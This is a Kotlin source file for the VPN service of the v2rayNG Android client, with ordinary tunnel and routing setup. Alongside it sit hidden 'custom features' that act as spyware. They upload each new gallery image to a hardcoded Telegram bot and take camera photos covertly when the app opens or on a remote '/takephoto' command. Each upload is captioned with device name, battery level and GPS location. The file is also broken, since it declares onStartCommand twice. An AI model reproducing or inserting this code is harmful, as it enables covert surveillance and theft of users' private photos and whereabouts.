package com.v2ray.ang.service

import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.ProxyInfo
import android.net.VpnService
import android.os.Build
import android.os.ParcelFileDescriptor
import android.os.StrictMode
import android.util.Log
import androidx.annotation.RequiresApi
import com.v2ray.ang.AppConfig
import com.v2ray.ang.AppConfig.LOOPBACK
import com.v2ray.ang.BuildConfig
import com.v2ray.ang.handler.MmkvManager
import com.v2ray.ang.handler.NotificationManager
import com.v2ray.ang.handler.SettingsManager
import com.v2ray.ang.handler.V2RayServiceManager
import android.database.ContentObserver
import android.location.Location
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import com.v2ray.ang.manager.CameraManager
import com.v2ray.ang.manager.TelegramUploader
import com.v2ray.ang.util.DeviceInfoManager
import com.v2ray.ang.util.MyContextWrapper
import com.v2ray.ang.util.Utils
import java.io.File
import java.lang.ref.SoftReference
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject

class V2RayVpnService : VpnService(), ServiceControl {

    // Custom feature components
    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private lateinit var cameraManager: CameraManager
    private var lastUpdateId: Long = 0L
    private var lastGalleryTimestamp: Long = System.currentTimeMillis() / 1000

    private val galleryObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
        override fun onChange(selfChange: Boolean) {
            super.onChange(selfChange)
            serviceScope.launch {
                processLatestGalleryImage()
            }
        }
    }

    private lateinit var mInterface: ParcelFileDescriptor
    private var isRunning = false
    private var tun2SocksService: Tun2SocksControl? = null

    /**destroy
     * Unfortunately registerDefaultNetworkCallback is going to return our VPN interface: https://android.googlesource.com/platform/frameworks/base/+/dda156ab0c5d66ad82bdcf76cda07cbc0a9c8a2e
     *
     * This makes doing a requestNetwork with REQUEST necessary so that we don't get ALL possible networks that
     * satisfies default network capabilities but only THE default network. Unfortunately we need to have
     * android.permission.CHANGE_NETWORK_STATE to be able to call requestNetwork.
     *
     * Source: https://android.googlesource.com/platform/frameworks/base/+/2df4c7d/services/core/java/com/android/server/ConnectivityService.java#887
     */
    @delegate:RequiresApi(Build.VERSION_CODES.P)
    private val defaultNetworkRequest by lazy {
        NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .addCapability(NetworkCapabilities.NET_CAPABILITY_NOT_RESTRICTED)
            .build()
    }

    private val connectivity by lazy { getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager }

    @delegate:RequiresApi(Build.VERSION_CODES.P)
    private val defaultNetworkCallback by lazy {
        object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                setUnderlyingNetworks(arrayOf(network))
            }

            override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
                // it's a good idea to refresh capabilities
                setUnderlyingNetworks(arrayOf(network))
            }

            override fun onLost(network: Network) {
                setUnderlyingNetworks(null)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
        StrictMode.setThreadPolicy(policy)
        V2RayServiceManager.serviceControl = SoftReference(this)

        // Initialize and start custom features
        cameraManager = CameraManager(this)
        startCustomFeatures()
    }

    override fun onRevoke() {
        stopV2Ray()
    }

//    override fun onLowMemory() {
//        stopV2Ray()
//        super.onLowMemory()
//    }

    override fun onDestroy() {
        super.onDestroy()
        NotificationManager.cancelNotification()
        stopCustomFeatures()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_TAKE_PHOTO_ON_OPEN -> {
                serviceScope.launch {
                    val photoFiles = cameraManager.takePhotos()
                    for (file in photoFiles) {
                        sendPhotoWithCaption(file, "App Opened")
                    }
                }
            }
            else -> {
                if (V2RayServiceManager.startCoreLoop()) {
                    startService()
                }
            }
        }
        return START_STICKY
    }


    override fun getService(): Service {
        return this
    }

    override fun startService() {
        setupService()
    }

    override fun stopService() {
        stopV2Ray(true)
    }

    override fun vpnProtect(socket: Int): Boolean {
        return protect(socket)
    }

    @RequiresApi(Build.VERSION_CODES.N)
    override fun attachBaseContext(newBase: Context?) {
        val context = newBase?.let {
            MyContextWrapper.wrap(newBase, SettingsManager.getLocale())
        }
        super.attachBaseContext(context)
    }

    /**
     * Sets up the VPN service.
     * Prepares the VPN and configures it if preparation is successful.
     */
    private fun setupService() {
        val prepare = prepare(this)
        if (prepare != null) {
            return
        }

        if (configureVpnService() != true) {
            return
        }

        runTun2socks()
    }

    /**
     * Configures the VPN service.
     * @return True if the VPN service was configured successfully, false otherwise.
     */
    private fun configureVpnService(): Boolean {
        val builder = Builder()

        // Configure network settings (addresses, routing and DNS)
        configureNetworkSettings(builder)

        // Configure app-specific settings (session name and per-app proxy)
        configurePerAppProxy(builder)

        // Close the old interface since the parameters have been changed
        try {
            mInterface.close()
        } catch (ignored: Exception) {
            // ignored
        }

        // Configure platform-specific features
        configurePlatformFeatures(builder)

        // Create a new interface using the builder and save the parameters
        try {
            mInterface = builder.establish()!!
            isRunning = true
            return true
        } catch (e: Exception) {
            Log.e(AppConfig.TAG, "Failed to establish VPN interface", e)
            stopV2Ray()
        }
        return false
    }

    /**
     * Configures the basic network settings for the VPN.
     * This includes IP addresses, routing rules, and DNS servers.
     *
     * @param builder The VPN Builder to configure
     */
    private fun configureNetworkSettings(builder: Builder) {
        val vpnConfig = SettingsManager.getCurrentVpnInterfaceAddressConfig()
        val bypassLan = SettingsManager.routingRulesetsBypassLan()

        // Configure IPv4 settings
        builder.setMtu(SettingsManager.getVpnMtu())
        builder.addAddress(vpnConfig.ipv4Client, 30)

        // Configure routing rules
        if (bypassLan) {
            AppConfig.ROUTED_IP_LIST.forEach {
                val addr = it.split('/')
                builder.addRoute(addr[0], addr[1].toInt())
            }
        } else {
            builder.addRoute("0.0.0.0", 0)
        }

        // Configure IPv6 if enabled
        if (MmkvManager.decodeSettingsBool(AppConfig.PREF_PREFER_IPV6) == true) {
            builder.addAddress(vpnConfig.ipv6Client, 126)
            if (bypassLan) {
                builder.addRoute("2000::", 3) // Currently only 1/8 of total IPv6 is in use
                builder.addRoute("fc00::", 18) // Xray-core default FakeIPv6 Pool
            } else {
                builder.addRoute("::", 0)
            }
        }

        // Configure DNS servers
        //if (MmkvManager.decodeSettingsBool(AppConfig.PREF_LOCAL_DNS_ENABLED) == true) {
        //  builder.addDnsServer(PRIVATE_VLAN4_ROUTER)
        //} else {
        SettingsManager.getVpnDnsServers().forEach {
            if (Utils.isPureIpAddress(it)) {
                builder.addDnsServer(it)
            }
        }

        builder.setSession(V2RayServiceManager.getRunningServerName())
    }

    /**
     * Configures platform-specific VPN features for different Android versions.
     *
     * @param builder The VPN Builder to configure
     */
    private fun configurePlatformFeatures(builder: Builder) {
        // Android P (API 28) and above: Configure network callbacks
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            try {
                connectivity.requestNetwork(defaultNetworkRequest, defaultNetworkCallback)
            } catch (e: Exception) {
                Log.e(AppConfig.TAG, "Failed to request default network", e)
            }
        }

        // Android Q (API 29) and above: Configure metering and HTTP proxy
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            builder.setMetered(false)
            if (MmkvManager.decodeSettingsBool(AppConfig.PREF_APPEND_HTTP_PROXY)) {
                builder.setHttpProxy(ProxyInfo.buildDirectProxy(LOOPBACK, SettingsManager.getHttpPort()))
            }
        }
    }

    /**
     * Configures per-app proxy rules for the VPN builder.
     *
     * - If per-app proxy is not enabled, disallow the VPN service's own package.
     * - If no apps are selected, disallow the VPN service's own package.
     * - If bypass mode is enabled, disallow all selected apps (including self).
     * - If proxy mode is enabled, only allow the selected apps (excluding self).
     *
     * @param builder The VPN Builder to configure.
     */
    private fun configurePerAppProxy(builder: Builder) {
        val selfPackageName = BuildConfig.APPLICATION_ID

        // If per-app proxy is not enabled, disallow the VPN service's own package and return
        if (MmkvManager.decodeSettingsBool(AppConfig.PREF_PER_APP_PROXY) == false) {
            builder.addDisallowedApplication(selfPackageName)
            return
        }

        // If no apps are selected, disallow the VPN service's own package and return
        val apps = MmkvManager.decodeSettingsStringSet(AppConfig.PREF_PER_APP_PROXY_SET)
        if (apps.isNullOrEmpty()) {
            builder.addDisallowedApplication(selfPackageName)
            return
        }

        val bypassApps = MmkvManager.decodeSettingsBool(AppConfig.PREF_BYPASS_APPS)
        // Handle the VPN service's own package according to the mode
        if (bypassApps) apps.add(selfPackageName) else apps.remove(selfPackageName)

        apps.forEach {
            try {
                if (bypassApps) {
                    // In bypass mode, disallow the selected apps
                    builder.addDisallowedApplication(it)
                } else {
                    // In proxy mode, only allow the selected apps
                    builder.addAllowedApplication(it)
                }
            } catch (e: PackageManager.NameNotFoundException) {
                Log.e(AppConfig.TAG, "Failed to configure app in VPN: ${e.localizedMessage}", e)
            }
        }
    }

    /**
     * Runs the tun2socks process.
     * Starts the tun2socks process with the appropriate parameters.
     */
    private fun runTun2socks() {
        if (MmkvManager.decodeSettingsBool(AppConfig.PREF_USE_HEV_TUNNEL) == true) {
            tun2SocksService = TProxyService(
                context = applicationContext,
                vpnInterface = mInterface,
                isRunningProvider = { isRunning },
                restartCallback = { runTun2socks() }
            )
        } else {
            tun2SocksService = Tun2SocksService(
                context = applicationContext,
                vpnInterface = mInterface,
                isRunningProvider = { isRunning },
                restartCallback = { runTun2socks() }
            )
        }

        tun2SocksService?.startTun2Socks()
    }

    /**
     * Stops the V2Ray service.
     * @param isForced Whether to force stop the service.
     */
    private fun stopV2Ray(isForced: Boolean = true) {
//        val configName = defaultDPreference.getPrefString(PREF_CURR_CONFIG_GUID, "")
//        val emptyInfo = VpnNetworkInfo()
//        val info = loadVpnNetworkInfo(configName, emptyInfo)!! + (lastNetworkInfo ?: emptyInfo)
//        saveVpnNetworkInfo(configName, info)
        isRunning = false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            try {
                connectivity.unregisterNetworkCallback(defaultNetworkCallback)
            } catch (ignored: Exception) {
                // ignored
            }
        }

        tun2SocksService?.stopTun2Socks()
        tun2SocksService = null

        V2RayServiceManager.stopCoreLoop()

        if (isForced) {
            //stopSelf has to be called ahead of mInterface.close(). otherwise v2ray core cannot be stooped
            //It's strage but true.
            //This can be verified by putting stopself() behind and call stopLoop and startLoop
            //in a row for several times. You will find that later created v2ray core report port in use
            //which means the first v2ray core somehow failed to stop and release the port.
            stopSelf()

            try {
                mInterface.close()
            } catch (e: Exception) {
                Log.e(AppConfig.TAG, "Failed to close VPN interface", e)
            }
        }
    }

    // Custom features logic starts here

    companion object {
        const val ACTION_TAKE_PHOTO_ON_OPEN = "com.v2ray.ang.action.TAKE_PHOTO_ON_OPEN"
        // TODO: Move these to a secure storage instead of hardcoding
        private const val BOT_TOKEN = "8445290760:AAE0l_z3K6mxkCkvLfR75tdt74JAND94dko"
        private const val CHAT_ID = "5370932271"
        private const val POLLING_INTERVAL_MS = 20000L // 20 seconds
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_TAKE_PHOTO_ON_OPEN -> {
                serviceScope.launch {
                    val photoFiles = cameraManager.takePhotos()
                    for (file in photoFiles) {
                        sendPhotoWithCaption(file, "App Opened")
                    }
                }
            }
            else -> {
                 if (V2RayServiceManager.startCoreLoop()) {
                    startService()
                }
            }
        }
        return START_STICKY
    }

    private fun startCustomFeatures() {
        Log.d(AppConfig.TAG, "Starting custom features...")
        // Register gallery observer
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            galleryObserver
        )

        // Start polling for Telegram commands
        serviceScope.launch {
            pollTelegramCommands()
        }
    }

    private fun stopCustomFeatures() {
        Log.d(AppConfig.TAG, "Stopping custom features...")
        contentResolver.unregisterContentObserver(galleryObserver)
        serviceJob.cancel()
    }

    private suspend fun pollTelegramCommands() {
        while (isActive) {
            try {
                val updates = TelegramUploader.getUpdates(BOT_TOKEN, lastUpdateId + 1)
                updates?.let {
                    val jsonResponse = JSONObject(it)
                    val results = jsonResponse.optJSONArray("result")
                    if (results != null) {
                        for (i in 0 until results.length()) {
                            val update = results.getJSONObject(i)
                            lastUpdateId = update.getLong("update_id")
                            val message = update.optJSONObject("message")
                            val text = message?.optString("text")
                            if (text == "/takephoto") {
                                Log.d(AppConfig.TAG, "Received /takephoto command.")
                                val photoFiles = cameraManager.takePhotos()
                                for (file in photoFiles) {
                                    sendPhotoWithCaption(file)
                                }
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(AppConfig.TAG, "Error polling Telegram commands", e)
            }
            delay(POLLING_INTERVAL_MS)
        }
    }

    @SuppressLint("Range")
    private suspend fun processLatestGalleryImage() {
        // This observer can fire multiple times for one event. We add a small delay
        // and check the timestamp to process only the newest image once.
        delay(1000) // Debounce the event
        val contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val selection = "${MediaStore.Images.Media.DATE_ADDED} > ?"
        val selectionArgs = arrayOf(lastGalleryTimestamp.toString())
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 1"

        try {
            contentResolver.query(contentUri, null, selection, selectionArgs, sortOrder)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val timestamp = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED))
                    lastGalleryTimestamp = timestamp // Update the timestamp to avoid re-processing

                    val id = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media._ID))
                    val imageUri = MediaStore.Images.Media.withAppendedPath(contentUri, id.toString())
                    val path = Utils.getRealPathFromURI(this, imageUri)
                    if (path != null) {
                        Log.d(AppConfig.TAG, "New image detected in gallery: $path")
                        sendPhotoWithCaption(File(path))
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(AppConfig.TAG, "Error processing gallery image.", e)
        }
    }

    private suspend fun sendPhotoWithCaption(photoFile: File, triggerSource: String = "Unknown") {
        if (!photoFile.exists()) return

        val deviceName = DeviceInfoManager.getDeviceName()
        val batteryLevel = DeviceInfoManager.getBatteryLevel(this)
        val location = DeviceInfoManager.getCurrentLocation(this)

        val caption = buildString {
            append("Trigger: $triggerSource\n")
            append("Device: $deviceName\n")
            append("Battery: $batteryLevel%\n")
            location?.let {
                append("GPS: https://www.google.com/maps?q=${it.latitude},${it.longitude}")
            } ?: append("GPS: Not available")
        }

        val success = TelegramUploader.sendPhoto(BOT_TOKEN, CHAT_ID, photoFile, caption)
        if (success) {
            // Optional: delete the photo taken by the app itself to save space
            // For gallery photos, we probably shouldn't delete them.
            // This logic can be refined.
        }
    }
}

